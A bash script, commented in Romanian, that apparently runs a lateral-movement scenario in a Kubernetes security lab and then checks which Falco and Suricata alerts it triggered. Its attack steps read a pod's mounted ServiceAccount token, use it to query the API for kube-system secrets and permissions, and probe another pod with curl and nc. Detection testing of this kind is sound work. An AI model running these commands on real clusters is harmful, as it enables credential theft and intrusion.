#!/bin/bash
# Scenariul 11 - Lateral Movement (TA0008)
# Un atacator care a compromis attack-pod fura token-ul ServiceAccount si il
# foloseste ca sa pivoteze: enumereaza K8s API, incearca acces in alte namespace-uri,
# verifica ce permisiuni are token-ul, apoi se misca east-west spre un alt pod (DVWA).
#
# MITRE: T1552.001 (Unsecured Credentials: SA token) -> T1550.001 (Use of App Access Token)
#        T1613 (Container & Resource Discovery), T1021 (Remote Services / pod-to-pod)
#
# Foloseste attack-pod existent + curl + token SA deja montat. Fara image pull.

set -e

POD=attack-pod
NS=attack-target
source "$(dirname "$0")/../_env.sh"

# Tinta east-west (DVWA pod, node-3) - verificat 2026-05-30
DVWA_POD=10.1.139.66

echo "=================================================="
echo "Scenariul 11 - Lateral Movement"
echo "Sursa: attack-pod ($NS)  |  API: \$KUBERNETES_SERVICE_HOST  |  East-west target: DVWA $DVWA_POD"
echo "Start: $(date +%T)"
echo "=================================================="

START_TS=$(date -u +%Y-%m-%dT%H:%M:%S.000Z)
echo "[marker] Start UTC: $START_TS"
echo ""

# ---------------------------------------------------------------------------
# step 1/5 - Fura token-ul ServiceAccount [T1552.001] -> credentialul de pivot
# ---------------------------------------------------------------------------
echo "[step 1/5] Citeste token-ul ServiceAccount montat (cat .../serviceaccount/token)"
kubectl exec -n $NS $POD -- bash -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  echo "  token length: ${#TOKEN} chars (furat); namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)"
'
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 2/5 - Autentificare la K8s API cu token-ul furat [T1550.001]
#            (enumereaza pod-urile din propriul namespace)
# ---------------------------------------------------------------------------
echo "[step 2/5] curl K8s API cu Bearer token -> GET /api/v1/namespaces/$NS/pods"
kubectl exec -n $NS $POD -- bash -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  API="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
  curl -sk -m 8 -o /dev/null -w "  HTTP %{http_code} <- GET /api/v1/namespaces/'"$NS"'/pods\n" \
    -H "Authorization: Bearer $TOKEN" "$API/api/v1/namespaces/'"$NS"'/pods"
'
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 3/5 - Pivot cross-namespace: enumereaza namespace-uri + secrete kube-system
#            [T1550.001 / T1613 / T1069] (probabil 403 cu SA default - dar atacul
#            e detectat la nivel de conexiune indiferent de raspuns)
# ---------------------------------------------------------------------------
echo "[step 3/5] Pivot cross-namespace: GET /api/v1/namespaces  +  /namespaces/kube-system/secrets"
kubectl exec -n $NS $POD -- bash -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  API="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
  for path in /api/v1/namespaces /api/v1/namespaces/kube-system/secrets /api/v1/secrets; do
    curl -sk -m 8 -o /dev/null -w "  HTTP %{http_code} <- GET $path\n" \
      -H "Authorization: Bearer $TOKEN" "$API$path"
  done
'
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 4/5 - Privilege discovery: ce poate face token-ul? (SelfSubjectAccessReview)
#            [T1613] - tehnica clasica de recon inainte de lateral movement real
# ---------------------------------------------------------------------------
echo "[step 4/5] SelfSubjectAccessReview: pot lista secrete in kube-system?"
kubectl exec -n $NS $POD -- bash -c '
  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
  API="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
  curl -sk -m 8 -X POST \
    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
    -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"kube-system\",\"verb\":\"list\",\"resource\":\"secrets\"}}}" \
    "$API/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
    -o /dev/null -w "  HTTP %{http_code} <- POST selfsubjectaccessreviews\n"
'
echo ""
sleep 2

# ---------------------------------------------------------------------------
# step 5/5 - East-west move: din pod-ul compromis spre un ALT pod (DVWA) [T1021]
#            Trafic cross-node (node-2 -> node-3)
# ---------------------------------------------------------------------------
echo "[step 5/5] Pod-to-pod: curl http://$DVWA_POD/  +  port-probe nc 3306 (MySQL DVWA)"
kubectl exec -n $NS $POD -- bash -c "
  curl -sk -m 6 -o /dev/null -w '  HTTP %{http_code} <- GET http://$DVWA_POD/ (DVWA index)\n' http://$DVWA_POD/ || echo '  curl DVWA failed'
  for p in 80 3306 8080; do nc -zv -w 2 $DVWA_POD \$p 2>&1 | head -1; done
"
echo ""

echo "=================================================="
echo "Atac terminat. Astept 45s pentru propagare ES (Falco + Suricata batch)..."
echo "=================================================="
sleep 45

echo ""
echo "=== Reguli FALCO declansate de la $START_TS ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_rule\":{\"terms\":{\"field\":\"rule.name\",\"size\":20}},\"by_priority\":{\"terms\":{\"field\":\"log.level\",\"size\":10}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo "=== Sample detectii (cronologic) ==="
curl -s "$ES/security-*/_search?size=15" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"sort\":[{\"@timestamp\":\"asc\"}],\"_source\":[\"@timestamp\",\"rule.name\",\"log.level\",\"output\"]}" \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
for h in d.get('hits',{}).get('hits',[]):
    s = h['_source']
    print(f\"  {s.get('@timestamp','?')[:19]} [{s.get('log',{}).get('level','?'):8}] {s.get('rule',{}).get('name','?')}\")
    out = s.get('output','')
    if out:
        print(f\"    -> {out[:200]}\")
"

echo ""
echo "=== Alertele SURICATA (pod-to-pod east-west) ==="
curl -s "$ES/security-*/_search?size=0" \
  -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"suricata\"}},{\"term\":{\"event_type.keyword\":\"alert\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}},\"aggs\":{\"by_signature\":{\"terms\":{\"field\":\"rule.name\",\"size\":20}},\"by_dest\":{\"terms\":{\"field\":\"destination.ip\",\"size\":10}}}}" \
  | python3 -m json.tool | sed -n '/aggregations/,$p'

echo ""
echo -n "Total Falco events: "
curl -s "$ES/security-*/_count" -H 'Content-Type: application/json' \
  -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"tags\":\"falco\"}},{\"range\":{\"@timestamp\":{\"gte\":\"$START_TS\"}}}]}}}"
echo ""

echo ""
echo "End: $(date +%T)"
